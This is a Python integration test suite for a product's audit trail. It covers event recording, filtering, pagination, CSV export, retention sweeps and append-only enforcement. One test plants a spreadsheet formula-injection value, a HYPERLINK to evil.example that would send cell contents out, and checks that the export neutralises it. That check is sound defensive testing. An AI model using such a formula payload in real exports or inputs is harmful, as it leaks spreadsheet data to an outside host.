"""The audit trail (LEKA-407), end to end — Acme (test_knowledge_graph), its
admin and member; Globex, another workspace.

What these protect:
- Representative events of every kind leave one record each, in one shape —
  who, as which role, when, what, to what, the outcome, from where:
  a member invited (team), a source created and its secret rotated (data,
  never the secret), an entity restricted and read by who may (data), a
  member refused it (access, denied), a policy created (governance), an
  agent asked and run by LEKA for them (ai), what an AI control did (ai).
- The trail is searched — by category, action and "kind.*", outcome,
  person, target, words, period, request — a page at a time, the latest
  first; one event read with what else its request did; exported as CSV,
  the export itself kept.
- Who may: `audit:read` (admins); a member reads nothing; another
  workspace sees nothing of it; the retention is the owner's alone.
- Retention: 90 days to seven years, 365 by default; the sweep deletes what
  outlived it — and says so — and nothing else.
- No product flow changes or deletes a record: the database refuses an
  UPDATE and a DELETE but the sweep's — and the workspace's own deletion.
"""

# ruff: noqa: F811 — the fixtures of test_sources_api are imported to be requested by name.
from __future__ import annotations

import csv
import io
import uuid
from collections.abc import Callable
from datetime import UTC, datetime, timedelta
from typing import Any

import pytest
from httpx import AsyncClient
from sqlalchemy import text
from sqlalchemy.exc import DBAPIError

from leka.capabilities import sync_catalogue
from leka.db import session_factory, workspace_scope
from leka.governance import sweep_audit
from tests.conftest import FakeIdentity
from tests.test_agent_runs_api import (
    Script,
    _run,
    gemini,
    leka_gemini,  # noqa: F401 — a fixture
    queued,  # noqa: F401 — a fixture
)
from tests.test_capabilities_api import _connect
from tests.test_context_engine import model
from tests.test_knowledge_graph import BILLING
from tests.test_sources_api import FAKE_KEY, _as, acme, fake_connector  # noqa: F401 — fixtures

pytestmark = pytest.mark.integration

_ = model  # a fixture, requested by name
API = "/api/v1/governance/audit"
ARCHITECT = "application-architecture"


async def _ok(response: Any, code: int = 200) -> Any:
    assert response.status_code == code, response.text
    return response.json() if response.content else None


async def _events(client: AsyncClient, **params: Any) -> list[dict[str, Any]]:
    page = await _ok(await client.get(API, params={"limit": 200, **params}))
    events: list[dict[str, Any]] = page["events"]
    return events


async def _sql(workspace: uuid.UUID, statement: str, **params: Any) -> None:
    with workspace_scope(workspace):
        async with session_factory() as session:
            await session.execute(text(statement), params)
            await session.commit()


async def _owner(acme: dict[str, uuid.UUID]) -> None:
    await _sql(
        acme["acme"],
        "UPDATE memberships SET role = 'owner' WHERE user_id = :u AND workspace_id = :w",
        u=acme["admin"],
        w=acme["acme"],
    )


async def test_what_happens_is_kept_one_shape_whoever_did_it(
    client: AsyncClient,
    identity: FakeIdentity,
    model: dict[str, uuid.UUID],
    acme: dict[str, uuid.UUID],
    leka_gemini: Callable[..., Script],
) -> None:
    _as(identity, acme, "admin")
    # Team: someone invited.
    await _ok(
        await client.post(
            "/api/v1/members/invite", json={"email": "lea@acme.example", "role": "member"}
        ),
        201,
    )
    # Data: a source made, its secret rotated — the secret kept nowhere here.
    created = await _ok(
        await client.post(
            "/api/v1/sources",
            json={"type": "slack", "display_name": "Fake", "credentials": {"api_key": FAKE_KEY}},
        ),
        201,
    )
    await _ok(
        await client.put(
            f"/api/v1/sources/{created['id']}/credentials",
            json={"credentials": {"api_key": FAKE_KEY + "-2"}},
        )
    )
    # Data: an entity restricted, read by who may — refused to who may not.
    billing = str(model[BILLING])
    await _ok(
        await client.put(
            f"/api/v1/governance/restrictions/{billing}", json={"reason": "Données de paiement"}
        )
    )
    await _ok(await client.get(f"/api/v1/knowledge/entities/{billing}"))
    _as(identity, acme, "member")
    assert (await client.get(f"/api/v1/knowledge/entities/{billing}")).status_code == 404
    # A member reads no audit.
    assert (await client.get(API)).status_code == 403

    # Governance: a policy. AI: an agent asked, run by LEKA for them.
    _as(identity, acme, "admin")
    await _ok(
        await client.post(
            "/api/v1/governance/policies",
            json={
                "name": "Pas d'agent risqué",
                "effect": "deny",
                "actions": ["agent:run"],
                "risk_at_least": "high",
                "resource_types": ["capability"],
            },
        ),
        201,
    )
    leka_gemini(gemini("# Architecture — Paiement CB"))
    await sync_catalogue()
    await _connect(acme, "confluence")
    _as(identity, acme, "member")
    run = await _ok(
        await client.post(
            "/api/v1/agent-runs",
            json={"key": ARCHITECT, "inputs": {"parcours": "Paiement CB", "perimetre": "Digital"}},
        ),
        202,
    )
    assert await _run(acme, run["id"]) == {"status": "succeeded"}

    _as(identity, acme, "admin")
    events = await _events(client)
    said = {(e["category"], e["action"], e["outcome"]) for e in events}
    assert {
        ("team", "member.invited", "success"),
        ("data", "source.created", "success"),
        ("data", "source.credentials_rotated", "success"),
        ("data", "entity.restricted", "success"),
        ("data", "entity.restricted_read", "success"),
        ("access", "workspace:read", "denied"),
        ("governance", "policy.created", "success"),
        ("ai", "agent_run.requested", "success"),
        ("ai", "agent_run.succeeded", "success"),
    } <= said, sorted(said)
    # Never a secret, whatever the event.
    assert FAKE_KEY not in str(events)

    # Who, as which role, to what, from where.
    (rotated,) = [e for e in events if e["action"] == "source.credentials_rotated"]
    assert (rotated["actor_type"], rotated["actor_id"], rotated["actor_role"]) == (
        "user",
        str(acme["admin"]),
        "admin",
    )
    assert (rotated["target_type"], rotated["target_id"], rotated["target_label"]) == (
        "source",
        created["id"],
        "Fake",
    )
    assert rotated["request_id"] and rotated["detail"] == {"kind": "slack"}
    (refused,) = [e for e in events if e["outcome"] == "denied" and e["target_type"] == "entity"]
    assert (refused["actor_id"], refused["target_type"], refused["target_id"]) == (
        str(acme["member"]),
        "entity",
        billing,
    )
    # LEKA ran it, for the member.
    (ran,) = [e for e in events if e["action"] == "agent_run.succeeded"]
    assert ran["actor_type"] == "system" and ran["detail"]["for"] == str(acme["member"])
    assert ran["target_id"] == run["id"]

    # Another workspace sees none of it.
    _as(identity, acme, "other_admin")
    assert await _events(client) == []


async def test_searched_read_and_exported_by_who_may(
    client: AsyncClient,
    identity: FakeIdentity,
    acme: dict[str, uuid.UUID],
) -> None:
    _as(identity, acme, "admin")
    made = [
        await _ok(
            await client.post(
                "/api/v1/sources",
                json={
                    "type": "slack",
                    "display_name": f"Slack {n}",
                    "credentials": {"api_key": FAKE_KEY},
                },
            ),
            201,
        )
        for n in range(3)
    ]
    await _ok(await client.post(f"/api/v1/sources/{made[0]['id']}/disable"))
    assert (await client.delete(f"/api/v1/sources/{made[1]['id']}")).status_code == 204

    # By kind of action, outcome, target, words, person.
    sources = await _events(client, action="source.*")
    assert [e["action"] for e in sources] == [
        "source.deleted",
        "source.disabled",
        "source.created",
        "source.created",
        "source.created",
    ]
    assert [e["action"] for e in await _events(client, target_id=made[1]["id"])] == [
        "source.deleted",
        "source.created",
    ]
    assert len(await _events(client, q="Slack 2")) == 1
    assert len(await _events(client, actor=str(acme["member"]))) == 0
    assert len(await _events(client, category="data", outcome="success")) == 5
    assert await _events(client, category="team") == []
    later = (datetime.now(UTC) + timedelta(minutes=1)).isoformat()
    assert await _events(client, since=later) == []

    # A page at a time, the latest first, no event twice.
    first = await _ok(await client.get(API, params={"limit": 2, "action": "source.*"}))
    second = await _ok(
        await client.get(API, params={"limit": 2, "action": "source.*", "cursor": first["next"]})
    )
    third = await _ok(
        await client.get(API, params={"limit": 2, "action": "source.*", "cursor": second["next"]})
    )
    ids = [e["id"] for p in (first, second, third) for e in p["events"]]
    assert ids == [e["id"] for e in sources] and third["next"] is None

    # A cursor it did not hand out is refused, not read as "from the start".
    assert (await client.get(API, params={"cursor": "nope"})).status_code == 422

    # One event, and what else its request did.
    one = await _ok(await client.get(f"{API}/{sources[0]['id']}"))
    assert one["action"] == "source.deleted" and isinstance(one["related"], list)
    assert (await client.get(f"{API}/{uuid.uuid4()}")).status_code == 404

    # Exported as CSV — and the export kept.
    exported = await client.get(f"{API}/export", params={"action": "source.*"})
    assert exported.status_code == 200 and exported.headers["content-type"].startswith("text/csv")
    rows = list(csv.DictReader(io.StringIO(exported.text)))
    assert [r["action"] for r in rows] == [e["action"] for e in sources]
    assert FAKE_KEY not in exported.text
    # A name someone chose is never read as a formula by a spreadsheet.
    await _ok(
        await client.post(
            "/api/v1/sources",
            json={
                "type": "slack",
                "display_name": '=HYPERLINK("https://evil.example/?"&A2,"x")',
                "credentials": {"api_key": FAKE_KEY},
            },
        ),
        201,
    )
    hostile = await client.get(f"{API}/export", params={"action": "source.created"})
    labels = [r["target_label"] for r in csv.DictReader(io.StringIO(hostile.text))]
    assert labels[0] == '\'=HYPERLINK("https://evil.example/?"&A2,"x")'
    kept = (await _events(client, action="audit.exported"))[-1]
    assert kept["detail"]["count"] == 5 and kept["detail"]["filters"] == {"action": "source.*"}


async def test_retention_the_owner_s_and_the_sweep_deletes_only_what_expired(
    client: AsyncClient,
    identity: FakeIdentity,
    acme: dict[str, uuid.UUID],
) -> None:
    _as(identity, acme, "admin")
    settings = await _ok(await client.get(f"{API}/settings"))
    assert (settings["retention_days"], settings["min_days"], settings["max_days"]) == (
        365,
        90,
        2555,
    )
    # An admin reads it, changes it not: the owner's alone.
    assert (await client.put(f"{API}/settings", json={"retention_days": 120})).status_code == 403

    await _owner(acme)
    assert (await client.put(f"{API}/settings", json={"retention_days": 30})).status_code == 422
    kept = await _ok(await client.put(f"{API}/settings", json={"retention_days": 120}))
    assert kept["retention_days"] == 120 and kept["updated_by"] == str(acme["admin"])
    (changed,) = await _events(client, action="audit.retention_changed")
    assert changed["detail"] == {"before": 365, "after": 120}
    assert changed["actor_role"] == "owner"

    # Two old events, one recent: the sweep takes the old, says so, keeps the rest.
    for days in (200, 130, 10):
        await _sql(
            acme["acme"],
            "INSERT INTO audit_events (workspace_id, at, category, action, outcome, actor_type)"
            " VALUES (:w, now() - make_interval(days => :d), 'data', 'source.created',"
            " 'success', 'system')",
            w=acme["acme"],
            d=days,
        )
    before = len(await _events(client))
    swept = await sweep_audit()
    assert swept[str(acme["acme"])] == 2
    after = await _events(client)
    assert len(after) == before - 2 + 1
    (expired,) = [e for e in after if e["action"] == "audit.expired"]
    assert expired["detail"]["count"] == 2 and expired["actor_type"] == "system"
    # Again: nothing more is old enough.
    assert str(acme["acme"]) not in await sweep_audit()


async def test_no_product_flow_rewrites_or_deletes_a_record(
    client: AsyncClient,
    identity: FakeIdentity,
    acme: dict[str, uuid.UUID],
) -> None:
    _as(identity, acme, "admin")
    await _ok(
        await client.post(
            "/api/v1/sources",
            json={"type": "slack", "display_name": "Fake", "credentials": {"api_key": FAKE_KEY}},
        ),
        201,
    )
    # No route changes or deletes one.
    event = (await _events(client, action="source.created"))[0]
    assert (await client.delete(f"{API}/{event['id']}")).status_code == 405
    assert (await client.put(f"{API}/{event['id']}", json={})).status_code == 405

    with pytest.raises(DBAPIError, match="append-only"):
        await _sql(acme["acme"], "UPDATE audit_events SET outcome = 'failure'")
    with pytest.raises(DBAPIError, match="append-only"):
        await _sql(acme["acme"], "DELETE FROM audit_events")
    # A person forgotten with their account: their events stay, nameless.
    await _sql(
        acme["acme"],
        "UPDATE audit_events SET actor_id = NULL WHERE workspace_id = :w",
        w=acme["acme"],
    )
    assert all(e["actor_id"] is None for e in await _events(client))
